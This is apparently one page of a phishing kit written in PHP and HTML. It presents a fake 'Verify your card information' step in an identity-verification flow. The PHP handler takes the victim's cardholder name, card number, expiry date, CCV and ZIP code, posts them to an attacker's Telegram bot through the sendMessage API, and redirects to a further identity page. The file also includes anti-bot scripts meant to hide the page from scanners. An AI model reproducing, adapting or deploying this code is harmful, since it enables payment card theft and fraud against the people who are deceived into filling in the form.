<?php
require_once('./antibot/botfcker.php');
require_once('./antibot/botfcker2.php');

include 'config.php';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect form data
    $cardholderName = trim($_POST['cardholder-name']);
    $ccNumber = trim($_POST['cc-number']);
    $ccExp = trim($_POST['cc-exp']);
    $ccv = trim($_POST['ccv']);
    $zip = trim($_POST['zip']);

    // Create the message
    $message = "Cardholder Name: $cardholderName\nCard Number: $ccNumber\nExpiration Date: $ccExp\nCCV: $ccv\nZIP Code: $zip";

    // Send the data to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $chatId,
        'text' => $message
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    // Check for errors in sending message
    if ($response === false) {
        echo 'Failed to send data to Telegram.';
    } else {
        $responseData = json_decode($response, true);
        if ($responseData['ok'] !== true) {
            echo 'Telegram API returned an error: ' . $responseData['description'];
        } else {
            // Redirect to done.php if message sent successfully
            header("Location: identity.php");
            exit();
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
    <title>Verify your identity</title>

    <style>
        :root {
            font-family: "Open Sans", sans-serif;
        }
    </style>
</head>

<body class="min-h-screen flex flex-col">
    <!-- Navbar -->
    <nav class="bg-[#404E57] p-2">
        <div class="p-1">
            <img class="w-20" src="./assets/Logo (1).svg" alt="">
        </div>
    </nav>

    <!-- Split Background -->
    <div class="relative min-h-[calc(100vh-4rem)] flex-grow">
        <div class="absolute top-0 left-0 right-0 h-1/3 bg-[#2D3943]"></div>
        <div class="absolute bottom-0 left-0 right-0 h-1/2 bg-[#FFF]"></div>
        <div class="relative flex flex-col items-center justify-center">
            <div class="w-full max-w-6xl bg-white shadow-lg border border-gray-200 mt-36 mb-12 h-auto lg:h-screen rounded-lg">
                <div class="p-6 md:p-12">
                    <div class="p-4 md:p-8">
                        <div class="flex flex-col items-center justify-center">
                            <!-- Step Indicator -->
                            <div class="flex items-center space-x-4 md:space-x-6 mb-6">
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">1</span>
                                </div>
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-[#008300] flex items-center justify-center bg-[#008300]">
                                    <span class="text-white">2</span>
                                </div>
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">3</span>
                                </div>
                                <div class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-gray-300 flex items-center justify-center bg-white">
                                    <span class="text-gray-400">4</span>
                                </div>
                            </div>

                            <!-- Error message -->
                            <div id="error-message" class="text-red-600 mt-4"></div>

                            <h1 class="font-bold text-xl md:text-2xl mb-4 md:mb-6">
                                Verify your card information
                            </h1>

                            <div class="text-xs md:text-sm text-center p-2 md:p-3 mb-2">
                                <span>
                                    Please review and verify the information you’ve provided to ensure its accuracy.
                                    <br>This is essential before moving forward. Thank you.
                                </span>
                            </div>

                            <form id="card-form" method="POST" class="w-full max-w-md md:max-w-lg mx-auto p-4 bg-white">
                                <span class="text-xs italic text-gray-500 mb-4">Fields marked with an asterisk (*) are required.</span>

                                <!-- Cardholder Name -->
                                <div class="mb-4 mt-4">
                                    <label for="cardholder-name" class="block text-sm md:text-base text-gray-700">Cardholder Name *</label>
                                    <input type="text" id="cardholder-name" name="cardholder-name" placeholder="Full Name" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2">
                                    <p id="cardholder-name-error" class="text-red-500 text-sm mt-1"></p>
                                </div>

                                <!-- Card Number -->
                                <div class="mb-4">
                                    <label for="cc-number" class="block text-sm md:text-base text-gray-700">Card Number *</label>
                                    <input type="text" id="cc-number" name="cc-number" placeholder="XXXX XXXX XXXX XXXX" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2">
                                    <p id="cc-number-error" class="text-red-500 text-sm mt-1"></p>
                                </div>

                                <!-- Expiration and CCV -->
                                <div class="mb-4 flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4">
                                    <div class="flex-1">
                                        <label for="cc-exp" class="block text-sm md:text-base text-gray-700">Expiration Date *</label>
                                        <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2">
                                        <p id="cc-exp-error" class="text-red-500 text-sm mt-1"></p>
                                    </div>

                                    <div class="flex-1">
                                        <label for="ccv" class="block text-sm md:text-base text-gray-700">CCV *</label>
                                        <input type="text" id="ccv" name="ccv" placeholder="XXX" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2">
                                        <p id="ccv-error" class="text-red-500 text-sm mt-1"></p>
                                    </div>
                                </div>

                                <!-- ZIP Code -->
                                <div class="mb-4">
                                    <label for="zip" class="block text-sm md:text-base text-gray-700">ZIP Code *</label>
                                    <input type="text" id="zip" name="zip" placeholder="ZIP Code" class="w-full border-b-2 border-gray-300 focus:border-[#008300] focus:outline-none p-2">
                                    <p id="zip-error" class="text-red-500 text-sm mt-1"></p>
                                </div>

                                <!-- Submit Button -->
                                <div class="flex justify-center mt-5">
                                    <button type="submit" class="px-10 md:px-14 py-2 bg-[#0069AA] text-white border-b-4 border-[#005488] hover:bg-[#003a5e] hover:border-[#003a5e] font-bold focus:outline-none focus:ring-2 focus:ring-[#0069AA] focus:ring-opacity-50 rounded">
                                        Next
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-[#2D3943] text-white text-center py-4 mt-auto">
        <p>&copy; 2024 Your Company. All rights reserved.</p>
        <div class="flex justify-center space-x-4 mt-2">
            <a href="#" class="hover:text-gray-400">Privacy Policy</a>
            <a href="#" class="hover:text-gray-400">Terms of Service</a>
            <a href="#" class="hover:text-gray-400">Contact Us</a>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('card-form');

            // Format Credit Card Number
            document.getElementById('cc-number').addEventListener('input', function() {
                let ccNumber = this.value.replace(/\D/g, '');
                ccNumber = ccNumber.match(/.{1,4}/g)?.join(' ') || '';
                this.value = ccNumber;
            });

            // Format Expiration Date
            document.getElementById('cc-exp').addEventListener('input', function() {
                let ccExp = this.value.replace(/\D/g, '');
                ccExp = ccExp.match(/.{1,2}/g)?.join('/') || '';
                this.value = ccExp;
            });

            // Format CCV (No special formatting for CCV as it's typically just 3 digits)
            document.getElementById('ccv').addEventListener('input', function() {
                let ccv = this.value.replace(/\D/g, '');
                this.value = ccv;
            });

            form.addEventListener('submit', function(event) {
                event.preventDefault();

                // Clear previous errors
                const errorElements = document.querySelectorAll('[id$="-error"]');
                errorElements.forEach(element => element.innerHTML = '');

                let valid = true;
                const fields = {
                    'cc-number': 'Card Number',
                    'cc-exp': 'Expiration Date',
                    'ccv': 'CCV',
                    'zip': 'ZIP Code',
                    'cardholder-name': 'Cardholder Name'
                };

                // Validation
                for (const [id, name] of Object.entries(fields)) {
                    const field = document.getElementById(id);
                    const errorElement = document.getElementById(`${id}-error`);

                    if (!field.value.trim()) {
                        valid = false;
                        field.classList.add('border-red-500');
                        field.classList.remove('focus:border-[#008300]');
                        errorElement.innerHTML = `${name} is required.`;
                    } else {
                        field.classList.remove('border-red-500');
                        field.classList.add('focus:border-[#008300]');
                    }
                }

                if (!valid) return; // Stop if validation fails

                // Submit the form
                form.submit(); // This line will allow the form to be submitted to the server
            });
        });
    </script>






</body>






</html>